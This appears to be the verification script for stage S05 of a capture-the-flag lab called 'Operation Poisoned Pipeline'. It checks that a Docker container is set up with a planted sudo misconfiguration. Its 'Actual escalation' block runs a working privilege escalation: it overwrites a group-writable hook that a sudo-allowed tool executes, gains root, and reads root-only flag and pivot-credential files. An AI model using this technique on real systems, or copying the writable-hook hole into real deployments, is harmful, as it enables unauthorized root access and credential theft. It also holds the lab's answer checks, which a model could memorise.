#!/usr/bin/env bash
set -u

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

CONTAINER="pp-application"

PASS=0
FAIL=0

pass() { echo "[PASS] $1"; PASS=$((PASS + 1)); }
fail() { echo "[FAIL] $1"; FAIL=$((FAIL + 1)); }

echo "=============================================="
echo " Operation Poisoned Pipeline"
echo " Phase 11 - S05 Broken Trust Verification"
echo "=============================================="
echo

# --- Container state ---------------------------------------------------------
if docker inspect "${CONTAINER}" >/dev/null 2>&1; then
  pass "Application container exists"
else
  fail "Application container exists"
fi

RUNNING="$(docker inspect --format '{{.State.Running}}' "${CONTAINER}" 2>/dev/null || true)"
if [[ "${RUNNING}" == "true" ]]; then
  pass "Application container is running"
else
  fail "Application container is running"
fi

HEALTH="$(docker inspect --format '{{if .State.Health}}{{.State.Health.Status}}{{else}}unknown{{end}}' "${CONTAINER}" 2>/dev/null || true)"
if [[ "${HEALTH}" == "healthy" ]]; then
  pass "Application healthcheck is healthy"
else
  fail "Application healthcheck is healthy (status=${HEALTH})"
fi

# --- Sudoers boundary --------------------------------------------------------
SUDO_LIST="$(docker compose exec -T --user 10001:10001 application \
  sh -lc 'sudo -n -l 2>/dev/null' || true)"

if grep -q '/usr/local/bin/deploy-verify' <<<"${SUDO_LIST}"; then
  pass "pipeline-app may sudo /usr/local/bin/deploy-verify"
else
  fail "pipeline-app may sudo /usr/local/bin/deploy-verify"
fi

if grep -qE 'NOPASSWD:.*/bin/bash' <<<"${SUDO_LIST}"; then
  fail "pipeline-app must NOT sudo /bin/bash"
else
  pass "pipeline-app may not sudo /bin/bash"
fi

if grep -qE 'NOPASSWD:.*/bin/sh' <<<"${SUDO_LIST}"; then
  fail "pipeline-app must NOT sudo /bin/sh"
else
  pass "pipeline-app may not sudo /bin/sh"
fi

if grep -qE 'NOPASSWD:.*/usr/bin/python' <<<"${SUDO_LIST}"; then
  fail "pipeline-app must NOT sudo python"
else
  pass "pipeline-app may not sudo python"
fi

if grep -qE 'NOPASSWD:.*/usr/bin/find' <<<"${SUDO_LIST}"; then
  fail "pipeline-app must NOT sudo find"
else
  pass "pipeline-app may not sudo find"
fi

# Direct sudo attempt must fail
if docker compose exec -T --user 10001:10001 application \
     sh -lc 'sudo -n /bin/bash -c "id" >/dev/null 2>&1'; then
  fail "pipeline-app cannot directly sudo /bin/bash"
else
  pass "pipeline-app cannot directly sudo /bin/bash"
fi

# --- Trusted utility ---------------------------------------------------------
if docker compose exec -T application \
     sh -lc 'test -x /usr/local/bin/deploy-verify'; then
  pass "deploy-verify is installed and executable"
else
  fail "deploy-verify is installed and executable"
fi

DEPLOY_OWNER="$(docker compose exec -T application \
  sh -lc 'stat -c "%U:%G %a" /usr/local/bin/deploy-verify')"
if [[ "${DEPLOY_OWNER}" == "root:root 755" ]]; then
  pass "deploy-verify is root:root 0755"
else
  fail "deploy-verify is root:root 0755 (got ${DEPLOY_OWNER})"
fi

# --- Trusted hook group-writability ------------------------------------------
HOOK_META="$(docker compose exec -T application \
  sh -lc 'stat -c "%U:%G %a" /opt/nexora/hooks/verify.sh')"

if [[ "${HOOK_META}" == "root:pipeline-app 775" || "${HOOK_META}" == "root:pipeline-app 774" ]]; then
  pass "verify.sh is root:pipeline-app 0775"
else
  fail "verify.sh is root:pipeline-app 0775 (got ${HOOK_META})"
fi

if docker compose exec -T --user 10001:10001 application \
     sh -lc 'test -w /opt/nexora/hooks/verify.sh'; then
  pass "pipeline-app can write to verify.sh"
else
  fail "pipeline-app can write to verify.sh"
fi

# --- Config trust ------------------------------------------------------------
CONFIG="$(docker compose exec -T application \
  sh -lc 'cat /opt/nexora/config/deployment.conf')"

if grep -q '^validation_hook=/opt/nexora/hooks/verify.sh' <<<"${CONFIG}"; then
  pass "deployment.conf references the trusted hook"
else
  fail "deployment.conf references the trusted hook"
fi

# --- Actual escalation -------------------------------------------------------
source private/s05/s05.env

ESC_OUT="$(docker compose exec -T --user 10001:10001 application sh -lc '
  cp /opt/nexora/hooks/verify.sh /tmp/verify.bak
  cat > /opt/nexora/hooks/verify.sh <<"EOF"
#!/bin/bash
id
cat /root/s05_flag.txt
cat /root/s06_pivot.txt
EOF
  chmod 0755 /opt/nexora/hooks/verify.sh
  sudo -n /usr/local/bin/deploy-verify
  cp /tmp/verify.bak /opt/nexora/hooks/verify.sh
  rm -f /tmp/verify.bak
' 2>/dev/null || true)"

if grep -q 'uid=0' <<<"${ESC_OUT}"; then
  pass "Escalation yields UID 0 inside the container"
else
  fail "Escalation yields UID 0 inside the container"
fi

if grep -q 'uid=10001' <<<"${ESC_OUT}"; then
  fail "Escalation must not stay as pipeline-app"
else
  pass "Escalation does not stay as pipeline-app"
fi

if grep -qF "${S05_FLAG}" <<<"${ESC_OUT}"; then
  pass "Escalation recovers the expected S05 flag"
else
  fail "Escalation recovers the expected S05 flag"
fi

if grep -q 'S06_PIVOT_USER=pivot' <<<"${ESC_OUT}"; then
  pass "Escalation recovers the S06 pivot credential"
else
  fail "Escalation recovers the S06 pivot credential"
fi

# --- Pre-escalation denial ---------------------------------------------------
if docker compose exec -T --user 10001:10001 application \
     sh -lc 'test -r /root/s05_flag.txt' 2>/dev/null; then
  fail "pipeline-app cannot read /root/s05_flag.txt before escalation"
else
  pass "pipeline-app cannot read /root/s05_flag.txt before escalation"
fi

if docker compose exec -T --user 10001:10001 application \
     sh -lc 'test -r /root/s06_pivot.txt' 2>/dev/null; then
  fail "pipeline-app cannot read /root/s06_pivot.txt before escalation"
else
  pass "pipeline-app cannot read /root/s06_pivot.txt before escalation"
fi

# --- Root-only files ---------------------------------------------------------
S05_META="$(docker compose exec -T application \
  sh -lc 'stat -c "%U:%G %a" /root/s05_flag.txt')"
if [[ "${S05_META}" == "root:root 600" ]]; then
  pass "s05_flag.txt is root:root 0600"
else
  fail "s05_flag.txt is root:root 0600 (got ${S05_META})"
fi

S06_META="$(docker compose exec -T application \
  sh -lc 'stat -c "%U:%G %a" /root/s06_pivot.txt')"
if [[ "${S06_META}" == "root:root 600" ]]; then
  pass "s06_pivot.txt is root:root 0600"
else
  fail "s06_pivot.txt is root:root 0600 (got ${S06_META})"
fi

# --- S04 path still works ----------------------------------------------------
S04_CODE="$(docker compose exec -T application \
  curl -sS -o /dev/null -w '%{http_code}' -X POST \
  -H 'Content-Type: application/json' \
  -d '{"component":"nexora-utils"}' \
  http://127.0.0.1:5000/api/diagnostics/run 2>/dev/null || true)"

if [[ "${S04_CODE}" == "200" ]]; then
  pass "S04 diagnostics endpoint is still functional"
else
  fail "S04 diagnostics endpoint is still functional (got ${S04_CODE})"
fi

# --- Container security ------------------------------------------------------
PRIV="$(docker inspect --format '{{.HostConfig.Privileged}}' "${CONTAINER}")"
if [[ "${PRIV}" == "false" ]]; then
  pass "Container is not privileged"
else
  fail "Container is not privileged"
fi

PID_MODE="$(docker inspect --format '{{.HostConfig.PidMode}}' "${CONTAINER}")"
if [[ "${PID_MODE}" != "host" ]]; then
  pass "Host PID namespace is not used"
else
  fail "Host PID namespace is not used"
fi

NET_MODE="$(docker inspect --format '{{.HostConfig.NetworkMode}}' "${CONTAINER}")"
if [[ "${NET_MODE}" != "host" ]]; then
  pass "Host network mode is not used"
else
  fail "Host network mode is not used"
fi

if docker inspect "${CONTAINER}" | grep -Fq '/var/run/docker.sock'; then
  fail "Docker socket is absent"
else
  pass "Docker socket is absent"
fi

MOUNT_COUNT="$(docker inspect --format '{{len .Mounts}}' "${CONTAINER}")"
if [[ "${MOUNT_COUNT}" == "0" ]]; then
  pass "Application has no host mounts"
else
  fail "Application has no host mounts"
fi

CAP="$(docker compose exec -T application \
  sh -lc "awk '/^CapEff:/{print \$2}' /proc/1/status" 2>/dev/null | tr -d '\r')"
if [[ "${CAP}" == "0000000000000000" ]]; then
  pass "Flask PID 1 has no effective Linux capabilities"
else
  fail "Flask PID 1 has no effective Linux capabilities (got ${CAP})"
fi

# --- SSH must still be disabled ---------------------------------------------
if docker compose exec -T application \
     sh -lc 'ss -lntH | awk "{print \$4}" | grep -Eq "(\^|:)22\$"' 2>/dev/null; then
  fail "SSH is not listening in Phase 11"
else
  pass "SSH is not listening in Phase 11"
fi

# --- Network addresses -------------------------------------------------------
PLAYER_IP="$(docker inspect \
  --format '{{(index .NetworkSettings.Networks "poisoned-pipeline_player_net").IPAddress}}' \
  "${CONTAINER}")"
INTERNAL_IP="$(docker inspect \
  --format '{{(index .NetworkSettings.Networks "poisoned-pipeline_internal_net").IPAddress}}' \
  "${CONTAINER}")"

if [[ "${PLAYER_IP}" == "10.13.10.30" ]]; then
  pass "player_net address is 10.13.10.30"
else
  fail "player_net address is 10.13.10.30 (got ${PLAYER_IP})"
fi

if [[ "${INTERNAL_IP}" == "10.13.20.1" ]]; then
  pass "internal_net address is 10.13.20.1"
else
  fail "internal_net address is 10.13.20.1 (got ${INTERNAL_IP})"
fi

PORTS="$(docker port "${CONTAINER}" 2>/dev/null || true)"
if [[ -z "${PORTS}" ]]; then
  pass "Application has no host-published ports"
else
  fail "Application has no host-published ports"
fi

echo
echo "=============================================="
echo " RESULTS"
echo "=============================================="
echo "Passed: ${PASS}"
echo "Failed: ${FAIL}"
echo

if [[ "${FAIL}" -eq 0 ]]; then
  echo "PHASE 11 S05: PASSED"
  exit 0
else
  echo "PHASE 11 S05: FAILED"
  exit 1
fi
